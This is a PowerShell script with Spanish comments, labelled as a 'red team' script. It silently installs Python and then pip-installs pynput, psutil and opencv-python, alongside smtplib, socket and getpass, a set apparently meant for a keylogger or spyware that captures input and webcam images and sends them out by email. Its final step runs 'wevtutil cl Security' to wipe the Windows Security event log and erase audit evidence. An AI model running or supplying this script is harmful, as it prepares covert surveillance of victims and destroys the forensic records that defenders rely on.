# Rutas
$logFile = "$env:USERPROFILE\Desktop\redteam_log.txt"
"--- EJECUCIÓN DE SCRIPT RED TEAM $(Get-Date) ---" | Out-File -FilePath $logFile

# 1. Verifica si Python está instalado
"[*] Verificando instalación de Python..." | Tee-Object -FilePath $logFile -Append
$pythonCheck = Get-Command python -ErrorAction SilentlyContinue

if (-not $pythonCheck) {
    "[!] Python no encontrado. Descargando instalador..." | Tee-Object -FilePath $logFile -Append

    $pythonInstaller = "$env:TEMP\python_installer.exe"
    try {
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe" -OutFile $pythonInstaller
        Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
        "[+] Python instalado." | Tee-Object -FilePath $logFile -Append
    } catch {
        "[!] Error al descargar o instalar Python: $_" | Tee-Object -FilePath $logFile -Append
    }
} else {
    "[+] Python ya instalado." | Tee-Object -FilePath $logFile -Append
}

# 2. Instalar librerías necesarias
"[*] Instalando librerías de Python necesarias..." | Tee-Object -FilePath $logFile -Append

# Actualiza pip
try {
    python -m pip install --upgrade pip | Tee-Object -FilePath $logFile -Append
} catch {
    "[!] Error al actualizar pip: $_" | Tee-Object -FilePath $logFile -Append
}

# Lista de librerías requeridas
$libraries = @(
    "pynput",
    "psutil",
    "pyttsx3",
    "opencv-python",
    "thread6",           # threading es estándar, se omite pero se incluye como marcador
    "smtplib",           # estándar, no requiere instalación
    "email",             # estándar, no requiere instalación
    "pickle",            # estándar, no requiere instalación
    "socket",            # estándar
    "getpass",           # estándar
    "platform",          # estándar
    "time",              # estándar
    "os"                 # estándar
)

# Solo instala las que sí requieren instalación desde pip
$installables = @("pynput", "psutil", "pyttsx3", "opencv-python")

foreach ($lib in $installables) {
    "[-] Instalando: $lib" | Tee-Object -FilePath $logFile -Append
    try {
        python -m pip install $lib | Tee-Object -FilePath $logFile -Append
        "[+] Instalación de $lib completada." | Tee-Object -FilePath $logFile -Append
    } catch {
        "[!] Error al instalar $lib: $_" | Tee-Object -FilePath $logFile -Append
    }
}

"[+] Instalación de librerías completada." | Tee-Object -FilePath $logFile -Append

# 3. Eliminar eventos del visor de eventos (requiere permisos elevados)
"[*] Intentando limpiar eventos de seguridad..." | Tee-Object -FilePath $logFile -Append
try {
    wevtutil cl Security
    "[+] Eventos de seguridad eliminados correctamente." | Tee-Object -FilePath $logFile -Append
} catch {
    "[!] Error al eliminar eventos: $_" | Tee-Object -FilePath $logFile -Append
}

# 4. Fin del script
"[*] Script completado. Log generado en: $logFile" | Tee-Object -FilePath $logFile -Append
